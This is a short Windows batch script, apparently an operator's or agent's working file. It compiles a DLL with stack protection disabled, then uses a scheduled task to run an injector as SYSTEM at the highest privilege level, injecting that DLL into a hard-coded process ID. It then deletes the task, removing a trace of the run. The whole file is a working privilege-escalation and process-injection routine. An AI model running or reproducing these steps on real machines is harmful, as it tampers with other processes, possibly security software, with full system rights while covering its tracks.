@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfvt.cpp /Fe:dfvt.dll /link user32.lib > vt_build.log 2>&1
echo VTB=%errorlevel%
type vt_build.log
schtasks /create /tn dfa_vt /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfvt.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_vt
ping -n 8 127.0.0.1 >nul
schtasks /delete /tn dfa_vt /f >nul
type vt.txt
